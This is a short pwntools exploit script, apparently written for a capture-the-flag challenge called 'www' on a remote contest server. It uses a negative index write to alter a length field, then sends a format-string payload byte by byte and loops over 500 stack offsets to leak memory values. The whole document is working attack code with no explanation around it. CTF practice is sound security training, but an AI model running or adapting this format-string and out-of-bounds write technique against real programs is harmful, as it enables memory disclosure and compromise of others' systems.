from pwn import *
elf = ELF('./www', checksec=False)
libc = ELF('./libc', checksec=False)


#
for x in range(1, 501):
    with context.local(log_level = 'error'):
        #p = elf.process()
        p = remote('challenges1.hexionteam.com', 3002)
        #p = remote('172.17.0.2', 1337)
        payload = '%{:d}$p\x00'.format(x)
        p.sendline(b'-7 ' + p8(len(payload)))

        for i in range(len(payload)):
            p.sendline(b'%d %s' % (i,payload[i].encode('latin-1')))

        print(x,p.recv().decode())
        p.close()
#p.interactive()